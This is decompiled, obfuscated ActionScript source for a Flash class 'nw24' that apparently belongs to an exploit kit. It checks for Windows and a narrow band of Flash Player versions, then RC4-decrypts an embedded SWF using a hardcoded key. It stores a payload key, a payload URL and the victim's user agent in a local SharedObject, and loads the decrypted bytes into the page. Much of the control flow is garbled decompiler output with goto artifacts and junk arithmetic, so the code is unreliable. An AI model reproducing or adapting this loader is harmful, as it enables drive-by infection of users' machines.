package blobs
{
   import flash.display.Sprite;
   import flash.events.Event;
   import flash.utils.ByteArray;
   import Crypt.Crypt;
   import flash.net.SharedObject;
   import flash.display.Loader;
   import flash.system.Capabilities;
   
   public final class nw24 extends Sprite
   {
       
      private var targets_info:Object;
      
      private var config_json:Object;
      
      private var m_myClass06:Class;
      
      private var m_myStr08:String;
      
      public function nw24(param1:Object, param2:Object)
      {
         if(!_loc3_)
         {
            m_myClass06 = §nw24_swf_rc4$34d07e848b21593d1af96bf9e164de5c-1862901165§;
            if(!_loc3_)
            {
               if(_loc4_)
               {
                  addr34:
                  while(true)
                  {
                     this.targets_info = param2;
                     if(!_loc4_)
                     {
                        if(_loc3_)
                        {
                        }
                     }
                     break;
                  }
                  if(!_loc4_)
                  {
                  }
                  return;
               }
               addr54:
               while(true)
               {
                  super();
                  if(!_loc3_)
                  {
                     if(!_loc3_)
                     {
                     }
                     this.config_json = param1;
                  }
                  break;
               }
               if(stage)
               {
                  if(!_loc4_)
                  {
                     this.init();
                     if(!_loc4_)
                     {
                        addr129:
                     }
                  }
               }
               else
               {
                  addEventListener("addedToStage",this.init);
               }
               return;
            }
            while(_loc3_)
            {
               §§goto(addr54);
            }
            if(false === this.isSuitable())
            {
               if(!_loc3_)
               {
                  §§goto(addr111);
               }
               else
               {
                  §§goto(addr120);
               }
            }
            else
            {
               this.m_myStr08 = "edfdamtlkfg511485";
               if(!_loc4_)
               {
                  §§goto(addr120);
               }
            }
            §§goto(addr129);
         }
         while(true)
         {
            if(_loc4_)
            {
               §§goto(addr94);
            }
            else
            {
               §§goto(addr34);
            }
            §§goto(addr120);
         }
      }
      
      private final function init(param1:Event = null) : void
      {
         if(!_loc5_)
         {
            removeEventListener("addedToStage",this.init);
         }
         var _loc2_:ByteArray = new m_myClass06() as ByteArray;
         _loc2_ = Crypt.rc4(_loc2_,this.m_myStr08);
         var _loc3_:SharedObject = SharedObject.getLocal("nw24");
         if(!_loc6_)
         {
            _loc3_.clear();
            if(!_loc6_)
            {
               _loc3_.data["nw24"] = {
                  "key":this.config_json.key.payload,
                  "url":this.config_json.link.pnw24,
                  "uas":this.targets_info.userAgent
               };
               if(_loc5_)
               {
               }
            }
            addr89:
            var _loc4_:Loader = new Loader();
            _loc4_.loadBytes(_loc2_);
            if(!_loc6_)
            {
               this.stage.addChild(_loc4_);
            }
            return;
         }
         _loc3_.flush();
         §§goto(addr89);
      }
      
      public final function isSuitable() : Boolean
      {
         var _loc1_:* = Capabilities.version.toLowerCase().split(" ");
         if(!_loc3_)
         {
            §§push(_loc1_);
            §§push(0);
            if(_loc3_)
            {
               §§push(-((§§pop() - 31 - 8 + 1) * 107 - 106) * 21);
            }
            if(§§pop()[§§pop()] == "win")
            {
               §§push(this.getFlVerUint());
               if(!_loc3_)
               {
                  §§push(uint(§§pop()));
               }
               var _loc2_:* = §§pop();
               if(!_loc3_)
               {
                  §§push(_loc2_);
                  if(!_loc4_)
                  {
                     §§push(210000182);
                     if(_loc3_)
                     {
                        §§push(-(§§pop() + 1) + 31);
                     }
                     if(!_loc3_)
                     {
                        §§push(§§pop() >= §§pop());
                        if(!_loc3_)
                        {
                           if(§§pop())
                           {
                              if(_loc4_)
                              {
                              }
                           }
                           addr105:
                           return §§pop();
                        }
                        §§pop();
                     }
                     addr104:
                     §§goto(addr105);
                     §§push(§§pop() <= §§pop());
                  }
                  addr96:
                  §§push(210000241);
                  if(_loc3_)
                  {
                     §§push(---§§pop() - 18);
                  }
                  §§goto(addr104);
               }
               §§goto(addr96);
               §§push(_loc2_);
            }
         }
         return false;
      }
      
      private final function getFlVerUint() : uint
      {
         §§push(0);
         if(_loc5_)
         {
            §§push(--(§§pop() * 8) - 1);
         }
         §§push(0);
         if(_loc6_)
         {
            §§push(-(§§pop() - 58 + 47) - 31);
         }
         if(!_loc6_)
         {
            §§push(_loc1_);
            if(!_loc6_)
            {
               §§push(§§pop().length);
               §§push(4);
               if(_loc5_)
               {
                  §§push(§§pop() - 51 + 115 + 1 + 8 + 1 - 1);
               }
               if(§§pop() < §§pop())
               {
                  if(_loc6_)
                  {
                  }
               }
               else
               {
                  §§push(_loc1_);
                  if(!_loc6_)
                  {
                     §§push(4);
                     if(_loc6_)
                     {
                        §§push(§§pop() + 77 + 1 + 1 - 1);
                     }
                     §§push(§§pop().substr(§§pop()));
                     if(_loc6_)
                     {
                     }
                  }
               }
               §§push(_loc1_);
            }
            §§push(_loc4_);
            if(!_loc6_)
            {
               §§push(§§pop().length);
               §§push(4);
               if(_loc6_)
               {
                  §§push(-(-(§§pop() + 73) - 1));
               }
               addr106:
               if(§§pop() != §§pop())
               {
                  if(!_loc6_)
                  {
                     §§push(0);
                     if(_loc6_)
                     {
                        return -(§§pop() * 26 - 45) * 13 + 1;
                     }
                  }
                  loop0:
                  while(true)
                  {
                     if(!_loc6_)
                     {
                     }
                     loop1:
                     while(true)
                     {
                        §§push(_loc2_);
                        if(!_loc6_)
                        {
                           §§push(10);
                           if(_loc5_)
                           {
                              §§push((-(§§pop() * 85) - 76) * 65 - 30);
                           }
                           if(!_loc5_)
                           {
                              §§push(§§pop() * §§pop());
                              if(!_loc6_)
                              {
                                 §§push(uint(§§pop()));
                                 if(_loc5_)
                                 {
                                 }
                                 addr322:
                                 while(true)
                                 {
                                    addr323:
                                    loop3:
                                    while(true)
                                    {
                                       if(!_loc6_)
                                       {
                                       }
                                       §§push(_loc2_);
                                       if(!_loc5_)
                                       {
                                          addr337:
                                          loop4:
                                          while(true)
                                          {
                                             if(!_loc5_)
                                             {
                                                if(!_loc6_)
                                                {
                                                   §§push(1000);
                                                   if(_loc6_)
                                                   {
                                                      §§push(-§§pop() - 95 + 1 - 1);
                                                   }
                                                   if(!_loc5_)
                                                   {
                                                      loop5:
                                                      while(true)
                                                      {
                                                         loop6:
                                                         while(true)
                                                         {
                                                            addr355:
                                                            loop7:
                                                            while(true)
                                                            {
                                                               if(_loc6_)
                                                               {
                                                                  addr366:
                                                                  while(true)
                                                                  {
                                                                     addr368:
                                                                     while(true)
                                                                     {
                                                                        §§push(1000);
                                                                        if(_loc6_)
                                                                        {
                                                                           §§push(---§§pop() + 55);
                                                                        }
                                                                     }
                                                                  }
                                                               }
                                                               else
                                                               {
                                                                  addr258:
                                                                  while(true)
                                                                  {
                                                                     §§push(_loc2_);
                                                                     if(!_loc5_)
                                                                     {
                                                                        if(!_loc6_)
                                                                        {
                                                                           if(!_loc6_)
                                                                           {
                                                                              addr270:
                                                                              while(true)
                                                                              {
                                                                                 §§push(§§pop() + §§pop());
                                                                                 if(!_loc5_)
                                                                                 {
                                                                                    if(_loc5_)
                                                                                    {
                                                                                    }
                                                                                    addr377:
                                                                                    while(true)
                                                                                    {
                                                                                    }
                                                                                 }
                                                                                 else
                                                                                 {
                                                                                    break;
                                                                                 }
                                                                              }
                                                                              continue loop5;
                                                                              §§push(_loc3_);
                                                                           }
                                                                        }
                                                                        else
                                                                        {
                                                                           continue loop6;
                                                                        }
                                                                     }
                                                                     break loop7;
                                                                  }
                                                               }
                                                               loop10:
                                                               while(true)
                                                               {
                                                                  addr379:
                                                                  while(!_loc5_)
                                                                  {
                                                                     while(true)
                                                                     {
                                                                        if(_loc5_)
                                                                        {
                                                                           addr393:
                                                                           while(true)
                                                                           {
                                                                              addr395:
                                                                              while(true)
                                                                              {
                                                                                 addr396:
                                                                                 while(true)
                                                                                 {
                                                                                    addr397:
                                                                                    while(true)
                                                                                    {
                                                                                    }
                                                                                 }
                                                                              }
                                                                           }
                                                                        }
                                                                        else
                                                                        {
                                                                           addr163:
                                                                           while(true)
                                                                           {
                                                                              §§push(_loc2_);
                                                                              if(!_loc6_)
                                                                              {
                                                                                 if(!_loc5_)
                                                                                 {
                                                                                    addr171:
                                                                                    while(true)
                                                                                    {
                                                                                       §§push(_loc3_);
                                                                                       if(!_loc6_)
                                                                                       {
                                                                                          addr175:
                                                                                          while(true)
                                                                                          {
                                                                                             if(!_loc6_)
                                                                                             {
                                                                                                §§push(§§pop() + §§pop());
                                                                                                if(!_loc6_)
                                                                                                {
                                                                                                   addr180:
                                                                                                   while(true)
                                                                                                   {
                                                                                                      if(!_loc5_)
                                                                                                      {
                                                                                                         §§push(uint(§§pop()));
                                                                                                         if(_loc5_)
                                                                                                         {
                                                                                                            continue loop4;
                                                                                                         }
                                                                                                      }
                                                                                                      §§goto(addr397);
                                                                                                   }
                                                                                                }
                                                                                                else
                                                                                                {
                                                                                                   continue loop5;
                                                                                                }
                                                                                             }
                                                                                             §§goto(addr396);
                                                                                          }
                                                                                       }
                                                                                       else
                                                                                       {
                                                                                          §§goto(addr270);
                                                                                       }
                                                                                       §§goto(addr395);
                                                                                    }
                                                                                 }
                                                                                 §§goto(addr368);
                                                                              }
                                                                              while(true)
                                                                              {
                                                                                 if(!_loc6_)
                                                                                 {
                                                                                    if(!_loc6_)
                                                                                    {
                                                                                       if(!_loc6_)
                                                                                       {
                                                                                          if(_loc6_)
                                                                                          {
                                                                                             continue loop1;
                                                                                          }
                                                                                          addr301:
                                                                                          while(true)
                                                                                          {
                                                                                             §§push(_loc4_);
                                                                                             if(!_loc5_)
                                                                                             {
                                                                                                if(_loc6_)
                                                                                                {
                                                                                                   addr468:
                                                                                                   while(true)
                                                                                                   {
                                                                                                      §§push(0);
                                                                                                      if(_loc6_)
                                                                                                      {
                                                                                                         §§push(((§§pop() + 62) * 90 + 6) * 20 + 1 + 1);
                                                                                                      }
                                                                                                   }
                                                                                                }
                                                                                                addr491:
                                                                                                while(true)
                                                                                                {
                                                                                                   addr493:
                                                                                                   loop13:
                                                                                                   while(true)
                                                                                                   {
                                                                                                      addr494:
                                                                                                      while(true)
                                                                                                      {
                                                                                                         if(_loc5_)
                                                                                                         {
                                                                                                            break loop13;
                                                                                                         }
                                                                                                         §§goto(addr393);
                                                                                                      }
                                                                                                   }
                                                                                                   break loop7;
                                                                                                }
                                                                                             }
                                                                                             addr414:
                                                                                             while(true)
                                                                                             {
                                                                                                if(!_loc5_)
                                                                                                {
                                                                                                   §§push(2);
                                                                                                   if(_loc6_)
                                                                                                   {
                                                                                                      §§push(-(§§pop() - 1) + 1);
                                                                                                   }
                                                                                                   addr422:
                                                                                                   while(true)
                                                                                                   {
                                                                                                      if(!_loc5_)
                                                                                                      {
                                                                                                         if(!_loc5_)
                                                                                                         {
                                                                                                            §§push(uint(§§pop()[§§pop()]));
                                                                                                         }
                                                                                                         else
                                                                                                         {
                                                                                                            §§goto(addr491);
                                                                                                         }
                                                                                                      }
                                                                                                      addr451:
                                                                                                      while(true)
                                                                                                      {
                                                                                                      }
                                                                                                   }
                                                                                                }
                                                                                                addr442:
                                                                                                while(true)
                                                                                                {
                                                                                                   §§push(1);
                                                                                                   if(_loc5_)
                                                                                                   {
                                                                                                      §§push((§§pop() - 1) * 50 * 69 + 1);
                                                                                                   }
                                                                                                   §§goto(addr451);
                                                                                                }
                                                                                             }
                                                                                          }
                                                                                       }
                                                                                       else
                                                                                       {
                                                                                          continue loop0;
                                                                                       }
                                                                                    }
                                                                                    else
                                                                                    {
                                                                                       break loop10;
                                                                                    }
                                                                                 }
                                                                              }
                                                                           }
                                                                        }
                                                                        while(_loc6_)
                                                                        {
                                                                           §§goto(addr493);
                                                                        }
                                                                        continue loop0;
                                                                        if(!_loc5_)
                                                                        {
                                                                           if(!_loc6_)
                                                                           {
                                                                              if(_loc6_)
                                                                              {
                                                                                 §§goto(addr258);
                                                                              }
                                                                              else
                                                                              {
                                                                                 §§push(_loc2_);
                                                                                 if(!_loc5_)
                                                                                 {
                                                                                    §§push(_loc3_);
                                                                                    if(!_loc6_)
                                                                                    {
                                                                                       §§push(§§pop() + §§pop());
                                                                                       if(!_loc5_)
                                                                                       {
                                                                                          §§push(uint(§§pop()));
                                                                                          if(!_loc6_)
                                                                                          {
                                                                                             if(!_loc6_)
                                                                                             {
                                                                                                if(_loc6_)
                                                                                                {
                                                                                                   §§goto(addr163);
                                                                                                }
                                                                                                addr413:
                                                                                                while(true)
                                                                                                {
                                                                                                   §§goto(addr414);
                                                                                                }
                                                                                             }
                                                                                             else
                                                                                             {
                                                                                                continue loop3;
                                                                                             }
                                                                                          }
                                                                                          else
                                                                                          {
                                                                                             continue loop6;
                                                                                          }
                                                                                       }
                                                                                       §§goto(addr180);
                                                                                    }
                                                                                    §§goto(addr175);
                                                                                 }
                                                                                 §§goto(addr171);
                                                                              }
                                                                              §§goto(addr270);
                                                                           }
                                                                           §§goto(addr494);
                                                                        }
                                                                        else
                                                                        {
                                                                           continue;
                                                                        }
                                                                     }
                                                                  }
                                                                  while(_loc5_)
                                                                  {
                                                                     while(true)
                                                                     {
                                                                        §§goto(addr442);
                                                                     }
                                                                  }
                                                                  §§goto(addr366);
                                                               }
                                                            }
                                                         }
                                                      }
                                                      §§push(§§pop() * §§pop());
                                                   }
                                                }
                                                while(true)
                                                {
                                                   if(!_loc6_)
                                                   {
                                                      if(_loc5_)
                                                      {
                                                         §§goto(addr413);
                                                      }
                                                      §§goto(addr441);
                                                   }
                                                   §§goto(addr430);
                                                }
                                             }
                                             while(true)
                                             {
                                                §§goto(addr430);
                                             }
                                          }
                                       }
                                       addr506:
                                       return §§pop();
                                    }
                                 }
                              }
                              while(true)
                              {
                                 §§push(uint(§§pop()));
                                 if(!_loc5_)
                                 {
                                    if(!_loc5_)
                                    {
                                       if(!_loc5_)
                                       {
                                          if(!_loc5_)
                                          {
                                             if(!_loc6_)
                                             {
                                                if(_loc5_)
                                                {
                                                   §§goto(addr301);
                                                }
                                                §§goto(addr505);
                                             }
                                             §§goto(addr379);
                                          }
                                          §§goto(addr323);
                                       }
                                       §§goto(addr355);
                                    }
                                    §§goto(addr395);
                                 }
                                 §§goto(addr506);
                              }
                           }
                           while(true)
                           {
                              §§goto(addr377);
                           }
                        }
                        §§goto(addr232);
                     }
                  }
               }
               while(true)
               {
                  §§goto(addr468);
                  §§goto(addr106);
               }
            }
            while(true)
            {
               §§push(3);
               if(_loc5_)
               {
                  §§push(--§§pop() + 9);
               }
               if(!_loc6_)
               {
                  §§push(uint(§§pop()[§§pop()]));
                  if(!_loc6_)
                  {
                     §§goto(addr322);
                  }
                  §§goto(addr337);
               }
               §§goto(addr422);
            }
         }
         §§push(0);
         if(_loc5_)
         {
            return §§pop() - 1 - 1 - 1;
         }
      }
   }
}
